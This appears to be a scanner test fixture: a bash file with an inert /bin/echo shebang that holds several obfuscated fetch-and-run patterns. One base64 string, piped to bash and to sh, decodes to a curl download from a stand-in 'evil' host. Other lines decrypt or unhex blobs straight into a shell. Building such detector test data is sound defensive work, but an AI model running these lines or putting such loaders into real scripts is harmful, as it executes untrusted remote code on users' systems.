#!/bin/echo INERT-TEST-FIXTURE-DO-NOT-EXECUTE
# shellcheck shell=bash
# Scanner test data. Shebang is /bin/echo on purpose.

STAGE2="Y3VybCAtZnNTTCBodHRwczovL3N0YWdlMi5ldmlsLmV4YW1wbGUuY29tL3Auc2ggfCBiYXNo"
echo "$STAGE2" | base64 -d | bash

echo "Y3VybCAtZnNTTCBodHRwczovL3N0YWdlMi5ldmlsLmV4YW1wbGUuY29tL3Auc2ggfCBiYXNo" | base64 --decode | sh

openssl enc -d -aes-256-cbc -pbkdf2 -k hunter2 -in assets/blob.enc | bash

xxd -r -p assets/blob.hex | zsh
